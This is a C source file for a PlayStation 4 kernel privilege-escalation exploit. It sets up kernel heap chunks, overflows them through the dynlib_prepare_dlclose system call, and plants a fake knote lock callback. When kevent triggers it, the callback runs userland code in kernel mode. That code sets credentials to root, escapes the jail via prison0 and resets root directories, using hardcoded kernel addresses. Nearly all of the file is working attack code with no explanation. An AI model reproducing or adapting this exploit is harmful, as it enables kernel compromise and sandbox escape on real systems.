#include "common.h"
#include "alloc.h"
#include "util.h"
#include "types.h"

// Some good to go stack sizes
#define KExecChunkMax 0x100

// Chunk size controls
#define KExecIntermediateChunkSize 0x8000
#define KExecBufferChunkSize 0x8000
#define KExecOverflowChunkSize 0x8000

// Chunk count control
#define KExecIntermediateChuckCount 100

#ifdef __PS4__
__typeof__(__mb_sb_limit) __mb_sb_limit;
__typeof__(__mb_sb_limit) *__mb_sb_limit_address;
__typeof__(_CurrentRuneLocale) _CurrentRuneLocale;
__typeof__(_CurrentRuneLocale) *_CurrentRuneLocale_address;
__typeof__(__stdoutp) __stdoutp;
__typeof__(__stdoutp) *__stdoutp_address;
#endif

static inline struct thread *currentThreadGet(void)
{
	struct thread *td;
	__asm("movq %%gs:0, %0;" : "=r"(td));
	return td;
}

static inline uint64_t cr0Get(void)
{
	uint64_t cr0;
	__asm__ volatile("movq %%cr0, %0;" : "=r"(cr0));
	return cr0;
}

static inline void cr0Set(uint64_t cr0)
{
	__asm__ volatile("movq %0, %%cr0;" : : "r"(cr0));
}

static sigjmp_buf jmpbuf;

void runret(void)
{
	siglongjmp(jmpbuf, 1);
	return;
}

static char *debugMessage;
enum { DebugMessageSize = 0x1000 };

typedef int (*SysWrite)(struct thread *, struct write_args *);
#define kdebugf(td, format, ...) \
	do \
	{ \
		SysWrite sys_write = (SysWrite)0xffffffff8247b0f0; \
		struct write_args wargs; \
		sprintf(debugMessage, format, __VA_ARGS__); \
		wargs.fd = 1; \
		wargs.buf = debugMessage; \
		wargs.nbyte = strlen(debugMessage); \
		sys_write(td, &wargs); \
	} \
	while(0);

void run(void *arg)
{
	struct thread *td;
	struct ucred *cred;
	struct filedesc	*fdp;
	struct file *fp;
	struct socket *so;

	td = currentThreadGet();

	//cr0Set(cr0Get() & ~CR0_WP);

	cred = td->td_proc->p_ucred;
	cred->cr_uid = cred->cr_ruid = cred->cr_rgid = 0;
	//cred->cr_groups[0] = 0;
	cred->cr_prison = (struct prison *)0xffffffff83237250; //prison0
	fdp = td->td_proc->p_fd;
	fdp->fd_cdir = fdp->fd_rdir = fdp->fd_jdir = *(struct vnode **)0xffffffff832ef920; // rootvnode

	/*fp = fdp->fd_ofiles[KExecChunkSizeCalulate(0x8000)];
	fp->f_count = 2;
	so = fp->f_data;
	so->so_count = 2;
	so->so_head = NULL;
	so->so_rcv.sb_sel.si_tdlist.tqh_first = NULL;
	kdebugf(td, "file count: %i\n", fp->f_count);*/

	//((struct klist *)arg)[KExecChunkSizeCalulate(0x8000)].slh_first = so->so_rcv.sb_sel.si_tdlist.tqh_first;

	uint64_t rsp_v;
	__asm__ volatile("movq %%rsp, %0;" : "=r"(rsp_v));
	kdebugf(td, "foo %p\n", (rsp_v >> 48));

	//cr0Set(cr0Get() | CR0_WP);

	// Xfast_syscall
	__asm__ volatile(" \
		cli ; \
		movq %%gs:0x2a0, %%rsp; \
		subq $0xc0, %%rsp; \
		movq 0x40(%%rsp), %%rbp; \
		movq 0xa8(%%rsp), %%r11; \
		movq %0, %%rcx; \
		movq %%gs:0x2a8, %%rsp; \
 		swapgs; \
		sysretq; \
	" : : "r"(runret));
}

void dummy(void *arg){}

void kexecExploit(size_t intermediateChunkCount, size_t intermediateSize, size_t bufferSize, size_t overflowSize)
{
	int chunks[KExecChunkMax];
	int bufferChunk;
	int overflowChunk;
	uint8_t *map;
	long pageSize = sysconf(_SC_PAGESIZE);
	size_t mapChunkSize = (bufferSize + overflowSize);
	size_t mapOverflowSize = (0x100000000 + bufferSize) / 4;
	struct klist *kist;
	int i, r;
	int fd = KExecChunkSizeCalulate(intermediateSize);
	struct knote kote = {{0}};
	struct knlist knist = {{0}};

	printf("foo\n");
	fflush(stdout);
	sleep(1);
	uint64_t rsp_v;
	__asm__ volatile("movq %%rsp, %0;" : "=r"(rsp_v));
	printf("pppp: %p\n", (rsp_v >> 48));

	// setup kernel chunks
	for(i = 0; i < intermediateChunkCount; i++)
		chunks[i] = kexecAlloc(intermediateSize);
	// note errors
	for(i = 0; i < intermediateChunkCount; i++)
		if(chunks[i] < 0)
			printf("kexecAlloc: %i failed with %i\n", i, chunks[i]);

	bufferChunk = kexecAlloc(bufferSize);
	if(bufferChunk < 0)
		printf("bufferChunk: failed with %i\n", bufferChunk);

	overflowChunk = kexecAlloc(overflowSize);
	if(overflowChunk < 0)
		printf("overflowChunk: failed with %i\n", overflowChunk);

	// free first
	r = kexecFree(bufferChunk);
	if(r < 0)
		printf("kexecFree(bufferChunk) = %i\n", r);

	// setup userland
	map = mmap(NULL, mapChunkSize + pageSize, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
	if(map == MAP_FAILED)
	{
		for(i = 0; i < intermediateChunkCount; i++)
		{
			r = kexecFree(chunks[i]);
			if(r < 0)
				printf("kexecFree(chunks[%i]) = %i\n", i, r);
		}
		r = kexecFree(overflowChunk);
		if(r < 0)
			printf("kexecFree(overflowChunk) = %i\n", r);
		printf("mmap failed\n");
		return;
	}
	munmap(map + mapChunkSize, pageSize);

	// setup overflow
	kist = (struct klist *)(map + bufferSize);
	kist[fd].slh_first = &kote;

	knist.kl_list.slh_first = &kote;
	knist.kl_lock = run;
	knist.kl_unlock = knist.kl_assert_locked = knist.kl_assert_unlocked = dummy;
	knist.kl_lockarg = (void *)kist;

	kote.kn_link.sle_next = kote.kn_selnext.sle_next = NULL;
	kote.kn_knlist = &knist;
	EV_SET(&kote.kn_kevent, fd, EVFILT_READ, EV_DISABLE, 0, 0, NULL);
	kote.kn_sfflags = kote.kn_kevent.fflags;
	kote.kn_sdata = kote.kn_kevent.data;
	//kote.kn_fp = &fle;

	// overflow
	r = syscall(SYS_dynlib_prepare_dlclose, 1, map, &mapOverflowSize);
	//printf("SYS_dynlib_prepare_dlclose: %i\n", r);

	// free all intermediates
	for(i = 0; i < intermediateChunkCount; i++)
	{
		//printf("freeing: %i\n", i);
		//fflush(stdout);
		r = kexecFree(chunks[i]);
		if(r < 0)
			printf("kexecFree(chunks[%i]) = %i\n", i, r);
	}

	// trigger
	printf("Pre Trigger\n");
	fflush(stdout);
	sleep(1);
	if(sigsetjmp(jmpbuf, 1) == 0)
		kevent(overflowChunk, &kote.kn_kevent, 1, NULL, 0, NULL);
	//	sceKernelAddReadEvent(overflowChunk, kexecGetGlobalFileDescriptor(), 0, NULL);
	printf("Post Trigger\n");
	fflush(stdout);

	// pseudo clean
	//kist[fd].slh_first = NULL;
	knist.kl_lock = dummy;

	printf("clean overflow\n");
	fflush(stdout);
	// free overflow
	r = kexecFree(overflowChunk);
	//r = close(overflowChunk);
	if(r < 0)
		printf("kexecFree(overflowChunk) = %i\n", r);

	// if unclosed the process blocks (on some queue lock)
	printf("clean socket\n");
	fflush(stdout);
	//r = close(fd);
	//r = kexecCloseGlobalIfNeeded();
	if(r < 0)
		printf("kexecCloseGlobalIfNeeded() = %i\n", r);

	printf("clean map\n");
	fflush(stdout);
	munmap(map, mapChunkSize); // mapChunkSize - overflowSize = bufferSize
}

int main(int argc, char **argv)
{
	#ifdef __PS4__
	int libc = sceKernelLoadStartModule("libSceLibcInternal.sprx", 0, NULL, 0, 0, 0);
	sceKernelDlsym(libc, "__stdoutp", (void **)&__stdoutp_address);
	__stdoutp = *__stdoutp_address;
	sceKernelDlsym(libc, "__mb_sb_limit", (void **)&__mb_sb_limit_address);
	__mb_sb_limit = *__mb_sb_limit_address;
	sceKernelDlsym(libc, "_CurrentRuneLocale", (void **)&_CurrentRuneLocale_address);
	_CurrentRuneLocale = *_CurrentRuneLocale_address;

	// whatever we wanna use these in the kernel, they must be resolved by then
	ps4Resolve((void *)memcpy);
	ps4Resolve((void *)strlen);
	ps4Resolve((void *)sprintf);
	#endif

	debugMessage = malloc(DebugMessageSize);

	kexecExploit(KExecIntermediateChuckCount, KExecIntermediateChunkSize, KExecBufferChunkSize, KExecOverflowChunkSize);

	/*if (fork() == 0)
	{
		int a = utilSingleAcceptServer(9658);
		write(a, "foo", 3);
		close(a);
	}*/

	return EXIT_SUCCESS;
}
